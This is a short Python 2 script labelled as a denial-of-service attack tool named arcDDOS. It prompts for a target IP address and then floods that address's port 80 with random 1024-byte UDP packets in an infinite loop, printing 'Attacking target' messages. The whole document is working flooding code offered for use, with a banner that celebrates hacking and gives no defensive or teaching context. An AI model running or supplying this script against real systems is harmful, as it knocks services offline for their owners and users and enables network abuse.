#software: arcDDOS
#coder:blackleaf
#category: denial of service attack tool
#date: 04/01/2019
print  """
          ========================
          |software:     DDOS     |
          |coder: nelson marubu  |
          |hacking is an art     |
          =========================
       """
import socket
import random
import time

socket=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
host=raw_input("Target ip:")
port=80
socket.connect((host,port))
byte=random._urandom(1024)
sent=0

while 1:
	socket.sendto(byte,(host,port))
	print "[+]Attacking target on port 80" 
	sent=sent+1